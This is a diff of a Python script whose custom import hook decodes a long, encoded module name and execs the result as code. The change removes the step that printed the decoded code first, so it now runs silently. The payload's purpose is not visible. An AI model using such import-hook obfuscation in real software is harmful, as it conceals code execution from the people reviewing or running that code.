@@ -1,5 +1,4 @@
 
-
 import importlib, sys
 
 
@@ -11,16 +10,10 @@ def decode_str(s):
 
 
 class Finder_Loader():
-    seen = []
     def find_spec(self, fullname, path=None, target=None):
         #print("Finding spec:", fullname)
         self.name = fullname
         self.loader = self
-
-        if fullname == "run_me":
-            self.process()
-
-        self.seen.append(fullname)
         return self
     
     def load_module(self, name):
@@ -28,15 +21,15 @@ class Finder_Loader():
             return sys.modules[name]
         else:
             module = importlib.util.module_from_spec(importlib.machinery.ModuleSpec(name, self, origin="nonexistant"))
+            exec(self.process(), module.__dict__)
+
             sys.modules[name] = module
             return module
     
     def process(self):
-        s = "".join(self.seen)
+        s = "".join(self.name)
         s = decode_str(s)
-        print(f"code:\n{s}")
-        print("\nExecuting code:")
-        exec(s)
+        return s
 
 
 sys.meta_path.append(Finder_Loader())
@@ -45,7 +38,4 @@ with open(sys.argv[0], "r") as f:
     h = hash((f.read(), sys.argv[0]))
 
 
-import zzH_zzJ_zzA_zzF_zzL_n_h_zT_zw_zzD_zzD_zzG_r_f_zi_zzG_zzJ_zzD_zv_g_h_o
-
-import run_me
-
+import zzA_zzE_zzH_zzG_zzJ_zzL_f_zzR_zzR_zT_zq_zzR_zzR_zV_zq_zzR_zzR_zM_zq_zzR_zzR_zR_zq_zzR_zzR_zX_zq_zzF_zq_zz_zq_zzR_zf_zq_zzR_zzO_zq_zzR_zzR_zP_zq_zzR_zzR_zP_zq_zzR_zzR_zS_zq_zzJ_zq_zx_zq_zzR_zzA_zq_zzR_zzR_zS_zq_zzR_zzR_zV_zq_zzR_zzR_zP_zq_zzR_zzN_zq_zy_zq_zz_zq_zzG_zG_zzH_zzJ_zzA_zzF_zzL_n_h_zP_zzG_zzF_zw_h_o
